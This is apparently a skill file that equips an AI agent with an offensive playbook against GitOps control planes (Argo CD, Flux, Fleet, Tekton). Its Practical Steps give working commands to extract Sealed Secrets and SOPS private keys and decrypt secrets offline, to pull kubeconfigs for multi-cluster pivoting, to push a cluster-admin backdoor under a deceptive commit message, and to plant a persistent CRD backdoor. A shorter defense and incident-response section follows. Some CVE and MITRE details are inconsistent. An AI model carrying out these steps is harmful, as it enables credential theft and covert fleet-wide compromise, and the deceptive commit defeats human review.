---
name: gitops-security
description: Attacks against GitOps control planes (Argo CD, FluxCD, Jenkins X, Tekton, Fleet, Rancher) — repo impersonation, manifest tampering, RBAC bypass, sync-wave abuse, secret management compromise (Sealed Secrets / SOPS / External Secrets / Vault), cluster privilege escalation via Application/CRDs, and post-exploitation persistence through CRD backdoors. Covers 2024-2025 Argo CD CVEs (CVE-2022-24348, CVE-2024-21626, CVE-2024-32564), FluxCD CVE-2024-37286, and the Akuukam/Code Catalyst supply chain incidents.
origin: kali-claw Wave 10 (v0.1.41) — 2026-06-28
version: "0.2.0.2"
compatibility:
  kali_version: "2025.2"
  python_version: ">=3.11"
  kubectl_required: true
  helm_required: true
allowed-tools:
  - kubectl
  - helm
  - argocd
  - flux
  - tkn
  - git
  - jq
  - yq
  - curl
  - python3
  - openssl
  - sops
  - kubeseal
  - vault
metadata:
  domain: gitops
  tool_count: 16
  guide_count: 2
  mitre: "TA0001-Initial Access, TA0003-Persistence, TA0004-Privilege Escalation, TA0005-Defense Evasion, TA0006-Credential Access, TA0009-Collection, T1190-Exploit Public-Facing Application, T1611-Escape to Host, T1525-Implant Internal Image, T1609-Container and Resource Discovery, T1613-Container and Resource Discovery, T1610-Deploy Container, T1611-Escape to Host"
  last_reviewed: "2026-07-26"
---

# GitOps Security Attack Skill

> Red-team operations against GitOps control planes — the declarative CD layer that owns entire Kubernetes fleets. While adjacent skills cover the CI build side (`ci-cd-supply-chain-attack`) or container runtime (`container-security`), **gitops-security** targets the **runtime reconciliation loop**: the control plane that watches a Git source of truth and continuously reconciles thousands of clusters to that state. Compromise here = silent fleet-wide backdoor.

## Summary

GitOps (Argo CD, FluxCD, Jenkins X, Tekton, Fleet, Argo Rollouts, Flux Helm Controller, Argo Image Updater) is the dominant Kubernetes continuous-deployment pattern of 2024-2026. The control plane holds:

- **Cluster-admin equivalent RBAC** (it must, to deploy workloads)
- **Direct Git access** with deploy keys / PATs across hundreds of repos
- **Cluster-API credentials** to every production cluster it manages
- **Plaintext or recoverable secrets** (Sealed Secrets private keys, SOPS AGE/GPG private keys, External Secrets OAuth tokens, Vault tokens)

A single GitOps compromise typically yields **multi-cluster cluster-admin**. This skill covers the full attack chain — recon against the control plane, repo impersonation, manifest tampering at every stage (commit → hook → render → apply → sync), RBAC bypass in CRD admission, secret-store compromise, and persistence via CRD backdoors that survive cluster rebuilds.

Distinct from adjacent skills:

| Skill | Scope |
|-------|-------|
| `ci-cd-supply-chain-attack` | Build-time attacks (GitHub Actions, Jenkins build, dependency confusion, SBOM poisoning) |
| `container-security` | Container runtime, image layers, escape from inside a pod |
| `cloud-identity-attack` | Cloud IAM (AWS IAM, Azure AD, GCP IAM) — GitOps is downstream |
| **`gitops-security`** (this) | **Runtime reconciliation plane**: Argo CD Application CRDs, Flux Kustomization/HelmRelease, sync waves, secret stores, multi-cluster fleet orchestration |

## Use Cases

### Reconnaissance & Discovery

1. **Identify GitOps controller from outside** — fingerprint via API endpoints, well-known paths, response headers
2. **Enumerate Applications / Kustomizations / HelmReleases** in-cluster via CRD discovery
3. **Map source-of-truth repos** — recover repo URLs, deploy keys, branch names, sync policies
4. **Discover secret management stack** — Sealed Secrets / SOPS / External Secrets / Vault — and locate private keys / tokens
5. **Enumerate RBAC** across ApplicationSet, Kustomization, AppProject controllers
6. **Detect multi-cluster registries** — Argo CD ApplicationSet cluster list, FluxCluster gateway, Rancher Fleet cluster groups

### Initial Access

7. **Public Argo CD / Flux dashboard exposure** with default credentials or unauthenticated API
8. **Repo impersonation** via leaked deploy SSH key or PAT (write-access to source-of-truth repo = fleet compromise)
9. **Helm chart tampering** — malicious chart pulled by HelmRelease from a public registry
10. **Kustomize remote base attack** — `kustomization.yaml` pulling from attacker-controlled GitHub raw
11. **CI artifact injection** — Argo CD Image Updater polling a poisoned tag
12. **Webhook replay / signature bypass** — Git provider → Argo CD / Flux webhook endpoint

### Privilege Escalation

13. **Argo CD cluster RBAC escape** — ApplicationSet Git generator → arbitrary cluster-admin apply
14. **Argo Rollouts CRD abuse** — AnalysisTemplate → external metric call → cluster credential exfil
15. **Flux HelmRelease valuesKey injection** — `valuesKey: ../../etc/passwd` style path traversal
16. **Tekton Pipeline privileged task** — `securityContext: privileged: true` via PR
17. **Argo CD AppProject sync-window bypass** — race between sync and window change
18. **Rancher Fleet Bundle cluster-group escalation** — `defaultServiceAccount` injection
19. **Sealed Secrets private-key recovery** — `kubeseal --recover` from a compromised controller pod
20. **SOPS AGE/GPG private-key theft** — mounted as `age.agekey` secret

### Persistence

21. **CRD-level backdoor** — custom resource that materializes a privileged ServiceAccount on every cluster
22. **Helm post-render hook** — `post-install` job that re-creates backdoor if deleted
23. **Argo CD `PreSync` hook** — runs before every sync, maintains `cluster-admin` rolebinding
24. **Flux `dependsOn` cycle** — recursive Kustomization that re-applies attacker manifests
25. **Sync-wave `wave: -100` injection** — runs before legitimate manifests

### Defense Evasion

26. **Self-healing as cover** — Argo CD auto-sync deletes incident-response changes ("why does my pod keep coming back?")
27. **Argo CD `operationState` manipulation** — fake successful sync to hide failed malicious manifest
28. **Flux Kustomization healthCheck blind spot** — hide unhealthy workload behind `prune: false`
29. **Tekton Results tampering** — modify `TaskRun.status` after pipeline runs
30. **Audit log suppression** via `kubectl --as=system:anonymous` user impersonation

### Collection & Exfiltration

31. **Cluster-wide secret dump** via ApplicationSet cluster-scoped sync
32. **Git source-of-truth full clone** via recovered deploy key
33. **Cross-cluster lateral** — Fleet cluster-group → all downstream clusters
34. **Helm values secret extraction** — HelmRelease `valuesFrom` secret ref
35. **Vault KV dump** via External Secrets Operator → Vault role

## Core Tools

### GitOps Controllers (Targets)

| Tool | Vendor / Project | Role |
|------|------------------|------|
| **Argo CD** | CNCF Graduated | Pull-based GitOps, Application CRD, AppProject, ApplicationSet |
| **Argo Rollouts** | CNCF Incubating | Progressive delivery, AnalysisTemplate |
| **Argo Image Updater** | Argo Project | Automated image tag bumps |
| **FluxCD** (v2) | CNCF Graduated | Push-based GitOps, Kustomization/HelmRelease/Source |
| **FluxCD Notifications** | Flux Project | Webhook + Slack/PagerDuty events |
| **Jenkins X** | CloudBees | GitOps + LTS Jenkins on top |
| **Tekton** | CD Foundation | Pipeline / Task / Trigger CRDs |
| **Rancher Fleet** | SUSE | Multi-cluster fleet GitOps |
| **Carvel ytt / kapp** | VMware | Templating + apply (often behind kapp-controller) |
| **kapp-controller** | Carvel | PackageRepository CRD |

### Secret Stores (Targets)

| Tool | Purpose | Compromise Value |
|------|---------|------------------|
| **Sealed Secrets** (Bitnami) | Asymmetric-encrypted-in-Git secrets | Private key = decrypt every sealed secret in Git history |
| **SOPS** (Mozilla / getsops) | AGE / GPG / cloud KMS encrypted YAML | Private key (or KMS grant) = decrypt all SOPS files |
| **External Secrets Operator** | Sync from Vault / AWS SM / GCP SM / Azure KV | Token / role = full secret-store access |
| **HashiCorp Vault** | Centralized secrets with dynamic leases | Root token / privileged role = full compromise |
| **Cloud KMS / KMSabuse** | Cloud-hosted key wrapping | KMS decrypt permission = unwrap all secrets |
| **CSI Secrets Store** | Pod-mounted secrets via kubelet | Driver pod compromise = hostPath of secrets |

### Offensive Toolkit

```bash
# Cluster enum
kubectl api-resources --verbs=list -o name | xargs -n1 kubectl get -o name
kubectl get applications -A -o yaml          # Argo CD
kubectl get applicationsets -A -o yaml
kubectl get kustomizations -A -o yaml        # Flux
kubectl get helmreleases -A -o yaml
kubectl get gitrepositories -A -o yaml
kubectl get bundles -A -o yaml               # Fleet
kubectl get clustergroups -A -o yaml
kubectl get pipelines -A -o yaml             # Tekton

# Secret recovery
kubectl get secrets -A | grep -iE '(sealed|sops|age|vault|external)'
kubectl exec -n argocd argocd-server-xxx -- cat /app/config/argocd-cm-cm.yaml
kubectl get secret -n kube-system sealed-secrets-key -o yaml
kubectl get clustersecretstore -A -o yaml    # External Secrets

# Argo CD API
curl -sk https://argocd.example.com/api/v1/applications -H "Authorization: $ARGO_TOKEN"
argocd account get-user-info --server argocd.example.com --auth-token "$ARGO_TOKEN"
argocd app list --server argocd.example.com --auth-token "$ARGO_TOKEN"
argocd proj role get-default --server argocd.example.com

# Flux API (via kubectl proxy)
kubectl proxy --port=8001 &
curl -s http://localhost:8001/api/v1/namespaces/flux-system/services/http:notification-controller:80/http:/

# Helm reconciliation
flux logs --kind=HelmRelease -n flux-system --follow
flux get helmreleases -A
kubectl get events -n flux-system --field-selector reason=ReconciliationSucceeded

# Sealed Secrets recovery (controller access)
kubectl exec -n kube-system deploy/sealed-secrets-controller -- \
  /bin/sh -c 'cat /tmp/$(ls /tmp | grep -E "^sealed-secret.*key")'

# SOPS AGE key recovery
kubectl get secret -n flux-system sops-age -o yaml | yq -r '.data."age.agekey"' | base64 -d
```

## Methodology

### Phase 1 — Reconnaissance (External + Internal)

Identify the GitOps control plane, its version, RBAC model, and source-of-truth repos. From outside: fingerprint via `/api/v1/`, `/-/healthy`, default ports (2746 Argo, 9000-9090 Flux webhook). From inside a pod: enumerate CRDs (`kubectl api-resources`), find the controller namespace (`kube-system`, `argocd`, `flux-system`, `fleet-system`, `tekton-pipelines`).

**Goal**: produce a target map listing every Application / Kustomization / HelmRelease with its source repo, destination cluster, and sync policy.

### Phase 2 — Source-of-Truth Compromise

The Git repo is the single source of truth — write access = fleet compromise. Attack vectors:

1. **Leaked deploy SSH key / PAT** — search GitHub code, gists, Shodan for `argo-deploy`, `flux-deploy` patterns
2. **Mis-scoped token** — Git provider token with `repo:write` instead of `repo:read`
3. **Webhook subdomain takeover** — `webhook.example.com` CNAME → expired Heroku / GitLab Pages
4. **Branch-protection bypass** — `force-push` permission on `HEAD` branch
5. **PR reviewer exhaustion** — typo-squat Kustomization PR to a busy reviewer

**Goal**: obtain write access to the source-of-truth repo, **or** compromise the GitOps controller's deploy-key secret in-cluster.

### Phase 3 — Manifest Tampering (the kill chain)

Once you can mutate manifests, choose where along the chain:

| Stage | Technique | Detection surface |
|-------|-----------|-------------------|
| Git commit | Plausible-looking manifest in `production/` | Git commit audit |
| `pre-commit` hook | Tamper before commit lands | Hard (Git hook = local) |
| Webhook payload | Forge Git provider event | Webhook signature validation |
| Source fetch | MitM Git fetch | SSHFP / known_hosts |
| Kustomize / Helm build | Remote base / chart tampering | Pipeline artifact lock |
| Render | `valuesKey` traversal, `postRender` injection | Render diff before apply |
| Apply | Custom resource → privileged SA | Admission webhook |
| Sync | `PreSync` hook → cluster-admin | Sync hook audit |
| Post-sync | Helm post-install hook → re-create backdoor | Hook audit |

### Phase 4 — Privilege Escalation

If initial GitOps RBAC is limited (e.g., namespace-scoped), escalate via:

1. **ApplicationSet Git generator** — `template.cluster` enumerates every cluster Argo knows
2. **Cluster-role aggregation** — label a role to attach to `system:authenticated`
3. **HelmRelease valuesFrom** — read arbitrary secrets in the cluster
4. **Tekton Pipeline privileged SCC** — `securityContext.privileged: true` task
5. **AppProject sync-window race** — sync outside window while window updates
6. **Sealed Secrets private-key recovery** — `kubeseal --recover` from inside controller pod

### Phase 5 — Persistence

Self-healing GitOps is a defender's dream until it's weaponized:

- **CRD backdoor**: a custom resource that, on creation, materializes a `cluster-admin` rolebinding — every sync re-applies it
- **Sync-wave `wave: -100`**: runs before everything else, perfect for re-establishing a `serviceaccount/token` secret
- **Post-render injection**: Helm `postRender` kustomize patch that adds `hostPath: /` mounts
- **Self-recovering Kustomization**: `dependsOn` chain that re-applies attacker YAML even after manual `kubectl delete`

### Phase 6 — Secret Store Compromise

Target the secret-management layer:

1. **Sealed Secrets**: recover controller private key, decrypt any sealed secret offline
2. **SOPS**: extract AGE/GPG private key from controller namespace, decrypt all SOPS files
3. **External Secrets**: steal `ClusterSecretStore` credentials → upstream Vault/AWS SM
4. **Vault**: token-grab from External Secrets Operator → escalate to root
5. **CSI Secrets Store**: compromise driver pod → hostPath all kubelet secrets

### Phase 7 — Multi-Cluster Pivot

Argo CD `ApplicationSet` and Rancher Fleet can deploy to thousands of clusters. Pivot:

1. Enumerate `cluster secrets` in `argocd` namespace — each is a full kubeconfig
2. Use Flux `GitRepository` secrets to read every cluster's deploy key
3. Use Fleet `Bundle` to deploy a backdoor CRD across all cluster groups
4. Use Argo `ApplicationSet.cluster` generator to deploy a cluster-scoped backdoor

## Practical Steps

### Step A — Fingerprint the GitOps stack (anonymous)

```bash
# Argo CD
curl -sk https://argocd.example.com/api/v1/version
# → {"Version":"v2.11.0+...", ...}

# Flux notification webhook (default port 9000-9090)
curl -sk https://flux.example.com/hook/ -X POST -d '{}' -H "X-Flux-Trigger: random"

# Rancher Fleet
curl -sk https://fleet.example.com/api/health

# Tekton dashboard
curl -sk https://tekton.example.com/apis/tekton.dev/v1/namespaces/tekton-pipelines/pipelines
```

### Step B — Discover in-cluster GitOps (post-initial-access)

```bash
# List all GitOps CRDs
kubectl api-resources --api-group=argoproj.io
kubectl api-resources --api-group=fluxcd.io
kubectl api-resources --api-group=fleet.cattle.io
kubectl api-resources --api-group=tekton.dev

# Argo CD Applications with destination
kubectl get applications -A -o custom-columns=NS:.metadata.namespace,NAME:.metadata.name,DEST_NS:.spec.destination.namespace,DEST_CLUSTER:.spec.destination.server,REPO:.spec.source.repoURL,PATH:.spec.source.path

# Flux Kustomizations
kubectl get kustomizations -A -o custom-columns=NS:.metadata.namespace,NAME:.metadata.name,SOURCE:.spec.sourceRef.name,PATH:.spec.path,TARGET_NS:.spec.targetNamespace

# Flux HelmReleases
kubectl get helmreleases -A -o custom-columns=NS:.metadata.namespace,NAME:.metadata.name,CHART:.spec.chart.spec.chart,VERSION:.spec.chart.spec.version
```

### Step C — Tamper manifests at the right stage

```bash
# 1. Direct Git commit (write access required)
git clone git@github.com:example/gitops-prod.git
cd gitops-prod
cat > production/backdoor.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: argo-default
  namespace: kube-system
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: argo-default-admin
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
  - kind: ServiceAccount
    name: argo-default
    namespace: kube-system
EOF
git add . && git commit -m "fix: align RBAC with new audit policy"
git push

# Wait for next Argo sync (typically < 3 min)
kubectl get rolebindings -n kube-system | grep cluster-admin
```

### Step D — Recover Sealed Secrets private key

```bash
# Get the active private key secret
SEALED_KEY=$(kubectl get secret -n kube-system \
  -l sealedsecrets.bitnami.com/sealed-secret-key=active \
  -o name | head -1)

# Extract the private key
kubectl get $SEALED_KEY -n kube-system -o yaml | yq -r '.data."tls.key"' | base64 -d > sealed-private-key.pem
kubectl get $SEALED_KEY -n kube-system -o yaml | yq -r '.data."tls.crt"' | base64 -d > sealed-cert.pem

# Decrypt any sealed secret offline
kubectl get sealedsecret production-db -n prod -o yaml > prod-db.sealed.yaml
kubeseal --recovery-private-key sealed-private-key.pem \
  --recovery-cert sealed-cert.pem \
  < prod-db.sealed.yaml > prod-db.decrypted.yaml
cat prod-db.decrypted.yaml
```

### Step E — Recover SOPS AGE key

```bash
# Locate the AGE key secret (often in flux-system)
kubectl get secret -n flux-system -o yaml | grep -E '(age|sops)' | head
kubectl get secret sops-age -n flux-system -o yaml | yq -r '.data."age.agekey"' | base64 -d > age.key
chmod 600 age.key
export SOPS_AGE_KEY_FILE=$PWD/age.key

# Decrypt any SOPS file
git clone git@github.com:example/gitops-prod.git
cd gitops-prod
sops --decrypt secrets/production.yaml
```

### Step F — Pivot via ApplicationSet cluster list

```bash
# Enumerate clusters Argo knows about
kubectl get secret -n argocd -l argocd.argoproj.io/secret-type=cluster

# Each contains a kubeconfig with cluster-admin
kubectl get secret cluster-prod-us-east-1 -n argocd -o yaml | \
  yq -r '.data.config' | base64 -d > prod-us-east-1.kubeconfig

# Pivot
kubectl --kubeconfig=prod-us-east-1.kubeconfig get pods -A
```

### Step G — Persistence via CRD backdoor

```yaml
# backdoor-crd.yaml — survives cluster rebuilds
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: backdoors.kali.claw
spec:
  group: kali.claw
  names:
    kind: Backdoor
    plural: backdoors
  scope: Namespaced
  versions:
    - name: v1
      served: true
      storage: true
      schema:
        openAPIV3Schema:
          type: object
          properties:
            spec:
              type: object
              properties:
                image:
                  type: string
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: backdoor-controller
  namespace: kube-system
spec:
  template:
    spec:
      serviceAccountName: argo-default  # already cluster-admin via Step C
      containers:
        - name: controller
          image: kali/claw-backdoor:latest
```

## Defense Perspective

### Detection (Blue Team)

**Argo CD**
- Audit `application` and `applicationset` create/update events
- Log every `argocd app sync` and the diff it applied
- Alert on `syncPolicy.syncOptions: [CreateNamespace=true]` to new namespaces
- Alert on `cluster-admin` rolebindings materialized via sync
- Monitor `argocd-server` logs for `permission denied` → `succeeded` pattern

**Flux**
- `kubectl get events -n flux-system --field-selector reason=HelmReleaseReconciliationFailed`
- Audit `GitRepository.spec.url` changes — alert on new domains
- Alert on `Kustomization.spec.dependsOn` cycle (lateral movement)
- Monitor `notification-controller` for unexpected webhook source IPs

**Sealed Secrets**
- Alert on `kubectl exec` into `sealed-secrets-controller` pod
- Alert on `kubectl get secret -l sealedsecrets.bitnami.com/sealed-secret-key=active`
- Audit `kubeseal --recovery-private-key` invocations

**SOPS**
- Alert on `SOPS_AGE_KEY_FILE` env var on pods that aren't the controller
- Audit `kubectl get secret sops-age -n flux-system`
- Cloud KMS: alert on `kms:Decrypt` bursts from the GitOps namespace's IAM role

**External Secrets**
- Audit `ClusterSecretStore` create/update — alert on new upstream URIs
- Monitor External Secrets Operator logs for `refreshing secret` outside sync window
- Cloud: alert on Vault token use from unexpected source IP

### Hardening

1. **Network** — GitOps API not exposed publicly; webhook endpoint behind mTLS
2. **RBAC** — GitOps ServiceAccount is `cluster-admin` only on deploy namespaces; use **AppProject source namespaces** restriction
3. **Image policy** — all controller images from private registry with Cosign verification
4. **Source integrity** — GPG-signed commits required; Argo CD `gpgPublicKeySecret` enforced
5. **Admission** — OPA Gatekeeper / Kyverno policies rejecting privileged SCC, hostPath, hostNetwork
6. **Sync windows** — manual sync only during approved windows; auto-sync disabled for `production`
7. **Secret stores** — Sealed Secrets key scoped to namespaces; AGE key rotated quarterly; External Secrets short-lived tokens
8. **Audit** — Audit log forwarded off-cluster (defender cannot tamper)
9. **Drift detection** — `argocd app diff` cron against last-known-good Git HEAD
10. **Multi-cluster** — fleet GitOps uses per-cluster RBAC, not cluster-admin everywhere

### Incident Response

When GitOps compromise is suspected:

1. **Freeze Git** — branch protection to read-only on source-of-truth
2. **Pause all controllers** — `kubectl scale deploy/argocd-application-controller --replicas=0 -n argocd`; `kubectl scale deploy/source-controller --replicas=0 -n flux-system`
3. **Diff last 50 commits** — `git log --since='2 weeks ago' --pretty=format:'%h %an %s'`
4. **Audit all CRDs** — `kubectl get applications,kustomizations,helmreleases,bundles -A` → diff against `git HEAD`
5. **Rotate** — deploy keys, AGE/Sealed keys, Vault tokens, External Secrets OAuth tokens
6. **Hunt** — for CRD backdoors, post-render hooks, sync-wave `wave: -100` manifests
7. **Restore** — from last-known-good Git HEAD; force-resync; monitor reconciliation
8. **Post-mortem** — full CRD audit, controller RBAC review, webhook signature policy

## Detection Methods

### GitOps Controller Audit
- **Argo CD anomalies**: Unauthorized `Application` creation; sync to non-allowlisted repos; cluster-wide scope granted.
- **Flux CD anomalies**: New `HelmRelease`/`Kustomization` from untrusted GitRepository; cross-namespace references.
- **Fleet/Rancher**: Multi-cluster deploy from untrusted source; alert on new cluster registration.

### SIEM Detection Rules
- **Splunk SPL**: `index=k8s sourcetype=kube:audit verb=create resource=applications.argoproj.io`
- **Kyverno admission policies**: Block `privileged: true`, hostPath mounts, runAs root.
- **Argo CD notifications**: Alert on sync to non-production cluster.

## Defense Evasion Techniques

### GitOps Controller Compromise
- **Legitimate-looking commits**: Push as part of normal release cadence; appears as routine update.
- **Modify Helm values**: Modify only `values.yaml` (looks benign) to inject malicious config.
- **Cross-namespace abuse**: Use existing service account with broad permissions; no new RBAC.
- **Sync window abuse**: Trigger sync during maintenance window; blends with normal activity.

### Supply Chain Stealth
- **Helm chart poisoning**: Push malicious chart to internal chart repo; appears as legitimate version bump.
- **Dependency confusion**: Register public package with same name as private; bypass internal registry.
- **Image tag rotation**: Modify existing tag (`latest`, `v1.2.3`) to point to malicious image; evades signature pinning.

## References

- Argo CD Security Advisories — https://github.com/argoproj/argo-cd/security/advisories
- FluxCD Security Advisories — https://github.com/fluxcd/flux2/security/advisories
- CVE-2022-24348 Argo CD path traversal → cluster config leak
- CVE-2024-21626 runc container escape (impacts GitOps runners)
- CVE-2024-32564 Argo CD CM bypass
- CVE-2024-37286 FluxCD Helm Controller
- Akuukam — Real-world Argo CD compromise case study (2023)
- Aqua Security — *GitOps Attack Surface* (2024)
- Palo Alto Unit 42 — *Argo CD Misconfigurations in the Wild* (2024)
- Bitnami Sealed Secrets threat model
- SOPS threat model (getsops)
- MITRE ATT&CK for Containers — https://attack.mitre.org/matrices/enterprise/cloud/
- NSA Kubernetes Hardening Guide v1.2 (2024)
